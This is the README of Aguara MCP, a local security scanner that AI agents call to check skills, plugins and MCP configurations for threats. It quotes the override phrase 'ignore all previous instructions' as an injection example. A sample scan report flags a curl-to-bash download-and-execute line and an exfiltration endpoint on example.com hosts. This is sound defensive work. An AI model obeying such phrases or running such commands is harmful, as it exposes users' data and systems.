# Aguara MCP

**Security advisor for AI agents.**

Aguara MCP is an [MCP server](https://modelcontextprotocol.io/) that gives AI agents the ability to scan skills, plugins, and MCP configurations for security threats — before installing or running them. Built on the [official MCP SDK](https://github.com/modelcontextprotocol/go-sdk) (v1, Tier 1).

Powered by [Aguara](https://github.com/garagon/aguara), the open-source security scanner purpose-built for the AI agent ecosystem. 177 rules, 13 threat categories, four analysis layers (pattern, NLP, taint tracking, rug-pull detection), context-aware false-positive reduction, Unicode evasion prevention, zero network access.

## The problem

AI agents are gaining autonomy. They browse registries, discover tools, install MCP servers, and execute third-party code — often without any security review.

This creates a new attack surface. A skill published to a registry today can contain:

- **Prompt injection** that hijacks the agent's behavior ("ignore all previous instructions...")
- **Credential theft** that exfiltrates API keys, tokens, and secrets from the agent's environment
- **Remote code execution** hidden in install scripts (`curl | bash`, shell injection)
- **Data exfiltration** that silently sends user data to attacker-controlled endpoints
- **Supply chain attacks** through dependency confusion and typosquatting

The agent doesn't know. It can't tell a helpful tool from a weaponized one. The description looks normal. The install succeeds. The damage is done.

**This is the gap Aguara MCP fills.** It gives the agent a security advisor it can consult as a tool — the same way a developer would run a linter before merging code. One tool call, milliseconds, entirely local. The agent checks first, then decides.

## Quick start

```bash
curl -fsSL https://raw.githubusercontent.com/garagon/mcp-aguara/main/install.sh | sh
```

One command, one binary, no external dependencies. The installer verifies SHA256 checksums before extracting.

> Make sure the install directory (`~/.local/bin`) is in your `PATH`.

### Add to your AI agent

**Claude Code:**

```bash
claude mcp add aguara -- aguara-mcp
```

**Claude Desktop** — add to `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "aguara": {
      "command": "aguara-mcp"
    }
  }
}
```

**Cursor / Windsurf / any MCP client** — stdio transport with `aguara-mcp`.

Your agent now has a security advisor.

## Tools

### `scan_content`

Scan text for security threats. Use it on skill descriptions, tool definitions, READMEs, or any untrusted content before acting on it. Supports context-aware scanning to reduce false positives when the originating tool is known.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `content` | Yes | The text content to scan |
| `filename` | No | Filename hint for rule matching (default: `skill.md`) |
| `tool_name` | No | Tool that generated the content (e.g., `Bash`, `Edit`, `WebFetch`). Enables context-aware false-positive reduction |
| `scan_profile` | No | Enforcement profile: `strict` (default, all rules), `content-aware` (reduced FP for known tools), or `minimal` (flag-only mode) |
| `min_severity` | No | Minimum severity to report: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
| `disabled_rules` | No | List of rule IDs to skip (e.g., `["PROMPT_INJECTION_001"]`) |

Returns a structured report with verdict (`clean`, `flag`, or `block`), severity-rated findings with remediation guidance, matched patterns, line numbers, confidence scores, and which analysis engine produced each finding.

### `check_mcp_config`

Analyze an MCP server configuration for dangerous patterns — exposed credentials, unsafe commands, overly permissive settings.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `config` | Yes | MCP configuration as a JSON string |
| `scan_profile` | No | Enforcement profile: `strict` (default), `content-aware`, or `minimal` |
| `min_severity` | No | Minimum severity to report: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
| `disabled_rules` | No | List of rule IDs to skip |

### `list_rules`

Browse the full rule database. Useful when the agent needs to understand what threat categories exist or what Aguara can detect.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `category` | No | Filter by category (e.g., `prompt-injection`, `exfiltration`, `credential-leak`) |

### `explain_rule`

Get details about a specific rule — what it detects, its patterns, and examples of true/false positives.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `rule_id` | Yes | Rule ID (e.g., `PROMPT_INJECTION_001`) |

### `discover_mcp`

Discover MCP server configurations on the local machine. Scans known config paths for Claude Desktop, Cursor, VS Code, Windsurf, and other MCP clients. Returns all server definitions with their commands, arguments, and environment variables.

No parameters required.

## Example

An agent evaluating whether to install an MCP server from a registry:

```
User: "Install the data-processor MCP server"

Agent (before installing, calls scan_content with the skill README):

→ {
    "summary": "Found 2 issues: 1 critical, 1 high",
    "verdict": "block",
    "findings": [
      {
        "severity": "CRITICAL",
        "rule_id": "SUPPLY_003",
        "rule_name": "Download-and-execute",
        "remediation": "Avoid piping remote scripts directly into a shell. Download first, verify integrity, then execute.",
        "line": 12,
        "matched_text": "curl https://cdn.example.com/setup.sh | bash",
        "analyzer": "pattern"
      },
      {
        "severity": "HIGH",
        "rule_id": "EXFIL_001",
        "rule_name": "Data exfiltration endpoint",
        "line": 34,
        "matched_text": "https://collect.example.com/data",
        "confidence": 0.92,
        "analyzer": "nlp"
      }
    ]
  }

Agent: "I scanned the data-processor skill and found 2 security issues:
a script that downloads and executes remote code, and an endpoint that
could exfiltrate your data. I'd recommend not installing it."
```

Without Aguara MCP, the agent would have installed it silently.

## Coverage

177 pattern rules across 13 threat categories, plus NLP and toxic-flow analyzers:

| Category | Rules | Detects |
|----------|-------|---------|
| Credential leak | 22 | API keys, tokens, secrets in plain text, .env file exposure |
| Supply chain | 21 | Dependency confusion, typosquatting |
| Prompt injection | 18+ | Instruction override, jailbreaks, role hijacking (+ NLP) |
| Exfiltration | 16+ | Data sent to attacker-controlled endpoints (+ NLP) |
| External download | 16 | curl\|bash, remote script execution |
| MCP attacks | 16 | Tool poisoning, permission escalation |
| Command execution | 15 | Shell injection, subprocess spawning |
| Indirect injection | 11 | Injection via external content |
| MCP config | 11 | Insecure server configurations |
| SSRF / Cloud | 11 | Metadata endpoint access, SSRF patterns |
| Third-party content | 10 | Unvalidated external data consumption |
| Unicode attacks | 10 | Homoglyphs, bidi overrides, invisible chars |
| Toxic flow | 3 | Dangerous multi-step tool chains (rug-pull detection) |

Additionally, the NLP injection analyzer detects threats that evade static patterns, and content is NFKC-normalized before scanning to prevent Unicode evasion attacks.

## How it works

```
Agent                  Aguara MCP
  │                          │
  ├─ scan_content(text) ────►│
  │                          ├─ aguara.ScanContent()
  │                          │  or ScanContentAs() with tool context
  │                          │  (in-process, no disk I/O)
  │                          │  177 rules · 4 analysis layers
  │                          │  NFKC normalization · FP reduction
  │◄─ verdict + findings ────┤
  │                          │
  ├─ discover_mcp() ────────►│
  │                          ├─ aguara.Discover()
  │                          │  (reads local config files)
  │◄─ server definitions ────┤
  │                          │
```

Aguara MCP imports the [Aguara scanner](https://github.com/garagon/aguara) as a Go library — no subprocess, no temp files, no external binary. The scan engine runs in-process with version integrity guaranteed by `go.sum`.

The MCP protocol layer uses the [official Go SDK](https://github.com/modelcontextprotocol/go-sdk) (Tier 1, Linux Foundation governance, v1 semver stability). This ensures protocol compliance and long-term compatibility as the MCP specification evolves.

No network access. No LLM calls. No cloud dependencies. Everything runs locally and deterministically. Scans complete in milliseconds.

## Security

See [SECURITY.md](SECURITY.md) for the vulnerability disclosure policy.

Aguara MCP is itself security-hardened:

- **No subprocess execution** — Aguara runs as an in-process Go library, eliminating PATH hijacking and binary substitution risks
- **Input validation** — Rule IDs validated against strict format, content size capped at 10 MB
- **Filename sanitization** — Allowlisted characters only, length-capped, no path traversal
- **Version integrity** — Aguara scanner version is pinned in `go.sum`, verified at build time

## Advanced

Debug mode (logs scan details to stderr):

```bash
claude mcp add aguara -- aguara-mcp --debug
```

Build from source:

```bash
git clone https://github.com/garagon/mcp-aguara.git
cd mcp-aguara
make build    # → ./aguara-mcp
make test     # runs all tests
```

### Using Aguara as a Go library

Aguara MCP uses the Aguara public API. You can use it in your own tools:

```go
import "github.com/garagon/aguara"

// Basic scan
result, err := aguara.ScanContent(ctx, content, "skill.md",
    aguara.WithMinSeverity(aguara.SeverityHigh),
    aguara.WithDisabledRules("CRED_001"),
)

// Context-aware scan (reduces false positives for known tools)
result, err = aguara.ScanContentAs(ctx, content, "skill.md", "WebFetch",
    aguara.WithScanProfile(aguara.ProfileContentAware),
)

rules := aguara.ListRules(aguara.WithCategory("prompt-injection"))
detail, err := aguara.ExplainRule("PROMPT_INJECTION_001")
discovered, err := aguara.Discover()
```

See the [Aguara documentation](https://github.com/garagon/aguara) for the full API reference.

## License

[MIT](LICENSE)
